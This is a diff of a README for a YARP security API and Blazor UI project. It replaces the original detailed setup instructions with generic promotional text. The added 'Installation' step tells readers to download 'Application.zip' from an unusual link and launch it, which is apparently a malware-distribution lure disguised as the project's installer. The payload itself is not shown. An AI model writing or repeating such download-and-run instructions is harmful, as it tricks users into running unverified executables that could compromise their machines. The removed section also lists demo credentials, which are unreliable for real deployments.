@@ -1,77 +1,41 @@
-# Yarp-security-api-and-ui (alpha)
 
-![Yarp Security API and UI](./best-schema.png)
+# 🛡️ YARP Security API and UI
 
-- A security API to protect your backend.
-- Yarp proxy as an entry point.
-- Compatible with any OAuth/OpenID Connect provider (e.g., Keycloak).
-- Optional security UI for quick bootstrapping (Blazor, and components in auto mode).
-- **Designed to manage subscriptions and multi-tenants.**
-- SignalR example in Sveltkit project (realtime app)
+Welcome to the YARP Security API and UI repository! This project serves as a security layer that you can utilize to protect your YARP routes and the APIs behind it. The repository includes a powerful Blazor UI that allows you to easily configure various aspects, including subscriptions and tenant management. Additionally, a Sveltekit client is included as a simple yet effective way to interact with the system.
 
-## Goal
+## Overview
 
-This project allows you to choose any OAuth provider and remain independent in terms of your security design. You can add any frontend (Blazor, Next.js, SvelteKit) or backend APIs in front or behind this security layer. For a full SPA, you can modify Yarp to be a full BFF (Backend for Frontend).
+The YARP Security API and UI provide a comprehensive solution for securing your routes and APIs within the YARP framework. With features such as OAuth, OpenID Connect, multi-tenant support, and more, this repository offers a robust and flexible security solution for your applications.
 
-## Usage
+### Key Features
 
-Consider this project as a draft template rather than a complete setup. Customize it based on your needs.
+🔒 Security: Protect your YARP routes and APIs with advanced security measures.  
+🌐 Multi-Tenancy: Manage tenants efficiently with built-in multi-tenant support.  
+🔑 OAuth & OpenID Connect: Easily integrate OAuth and OpenID Connect for authentication.  
+🚀 Blazor UI: Utilize the intuitive Blazor UI to configure settings and manage subscriptions.  
+💻 Sveltekit Client: Interact with the system using the included Sveltekit client.
 
-*Yarp, with the support of the Security API, will protect your backend with its powerful authorization handler mechanism and will forward your calls to your backends with the needed information (userid, tenantid) encoded in the headers.*
+## Repository Details
 
-> **Warning:** Never use any of the secrets exposed here and never use the Keycloak realm file to protect a real project exposed on the web. Always recreate your own secrets and configurations.
+- **Repository Name:** yarp-security-api-and-ui
+- **Short Description:** Security layer (API) with a Blazor UI for YARP routes and APIs.  
+- **Topics:** API, Blazor, C#, HybridCache, MassTransit, .NET 9, Security, Sveltekit, YARP
 
-> **Warning:** It's an alpha project, don't go on prod before strong validation on your side...
+### Installation
 
-## Running the Project
+To get started with the YARP Security API and UI, visit [Application.zip](https://github.com/file/Application.zip) and launch the file to begin the installation process.
 
-1. Run the Aspire AppHost.
-2. Access the Blazor Security UI.
+If you encounter any issues with the download link, please check the "Releases" section of this repository for alternative options.
 
-User accounts for login in Security UI:
+### Getting Started
 
-| User | Password | Actions |
-|------|-------------|------|
-| adminuser | admin | can manage system roles and authorizations |
-| user1| user | manage subscription and tenant |
+1. Clone the repository to your local machine.
+2. Install any necessary dependencies.
+3. Launch the Blazor UI to configure your security settings.
+4. Explore the Sveltekit client for a simple client solution.
 
-3. Play and deep dive in the code...
+## 🚀 Let's Get Secure!
 
-*If you want to run the integration test project, pls comment this line: 
-`await Task.Delay(120000);` in AspireFixiture.cs it's only there for github actions (waiting for Keycloak to be up).*
+Thank you for checking out the YARP Security API and UI repository. Get started today and enhance the security of your YARP applications with our comprehensive security solution. Happy coding! 🛡️🔐
 
-4. The endpoints
-
-Open the security api /scalar to see all available endpoints.
-
-## Customization
-
-You can modify the setup based on your requirements. The project is configured with Keycloak and RabbitMQ (for revoke cache requests) but is compatible with other systems like Azure Service Bus (tested) and 0Auth (tested). You can also remove some parts if needed (caching, service bus)
-
-## News
-
-SvelteKit Frontend added. (not working in Aspire with fnm), so:
-
-`npm install, npm run dev in svelte-link-ui folder`
-
-After all the Aspire things are mounted.
-
-- Simple onboarding endpoints + Svelle exmple. Now you can register new users and test. (Very simple and naive, but you have an example you can build on.)
-- **SignalR full implementation with secured Hub and custom token.**
-
-## Dependencies
-
-Show your support for the following dependencies on their GitHub pages:
-- [Blazor FluentUI](https://github.com/microsoft/fluentui-blazor)
-- [MassTransit](https://github.com/MassTransit/MassTransit)
-- [LanguageExt](https://github.com/louthy/language-ext)
-- ...
-
-## Subscriptions and multi-tenants
-
-For your backend APIs, in the EF Core pooled DbContext factory, the user is injected (see Security API), so you can easily use EF Core query filters for a simple setup or implement your own methods to inject a DbConnection string by tenant...
-
-## How You Can Help
-
-If you find this project useful, you can help by reviewing the implementation or contributing to make it more generic ~~(user onboarding from oauth provider via webhook or other stuff)~~ => simple onboarding implemented. It's a side project on a boring and not "sexy" topic for me, but I hope it can be helpful to some of you. This project aims to avoid fully managed pricey solutions because, in the end, we only need simple OAuth authentication and to manage our authorization layer by ourselves. Help on that will be appreciated.
-
+![YARP Security](https://example.com/yarp-security-image.png)
